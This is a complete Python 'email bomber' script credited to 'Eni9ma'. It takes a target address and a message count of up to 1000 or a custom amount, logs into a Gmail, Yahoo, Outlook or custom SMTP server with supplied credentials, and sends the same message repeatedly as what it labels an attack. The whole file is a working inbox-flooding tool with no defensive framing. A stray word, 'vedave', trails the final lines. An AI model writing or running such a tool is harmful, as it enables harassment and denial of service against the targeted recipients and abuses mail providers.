#!/usr/bin/env python3  

import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + 'EMAIL BOMBER')
    print(bcolors.RED + 'by Eni9ma')

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.YELLOW + '\nInitializing program')
            self.target = str(input(bcolors.GREEN + 'Enter the target mail: '))
            self.mode = int(input(bcolors.YELLOW + 'Enter Bomb Mode (1,2,3,4): 1:(1000) | 2:(500) | 3:(250) | 4:(Custom): '))
            
            if self.mode not in [1, 2, 3, 4]:
                print(bcolors.RED + 'ERROR: Invalid option. Please try again.')
                sys.exit(1) 
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.GREEN + 'Setting up Bomber...')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            elif self.mode == 4:
                self.amount = int(input(bcolors.YELLOW + 'Enter a custom Amount: '))
            print(bcolors.RED + f'You have chosen Mode: {self.mode} ({self.amount})')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.GREEN + 'Setting Up Mail Server...')
            self.server = str(input(bcolors.GREEN + 'Select Server or Enter Email Server (1.Gmail 2.Yahoo 3.Outlook): '))
            premade = ['1', '2', '3']
            default_port = True

            if self.server not in premade:
                default_port = False
                self.port = int(input('Select a port no: '))

            if default_port:
                self.port = 587 

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from Address: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from Password: '))
            self.subject = str(input(bcolors.GREEN + 'Enter the Subject: '))
            self.message = str(input(bcolors.GREEN + 'Enter the message: '))

            self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'bomb: [{self.count}]')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\nInitiating Attack...')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print('Attack Completed Successfully')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()  
    vedave
